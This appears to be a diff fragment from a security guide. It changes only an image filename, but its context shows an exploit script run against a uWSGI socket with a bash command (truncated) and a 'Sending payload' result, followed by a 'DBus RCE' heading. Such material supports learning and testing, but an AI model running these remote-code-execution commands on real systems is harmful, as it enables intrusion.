@@ -503,7 +503,7 @@ qtc@de8d92c274d6:~$ python3 rce.py -m unix -u /tmp/uwsgi.socket -c 'bash -c "bas
 [*]Sending payload.
 ```
 
-<figure><img src="../../../.gitbook/assets/image (9) (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (9) (4) (3).png" alt=""><figcaption></figcaption></figure>
 
 ### DBus RCE
 
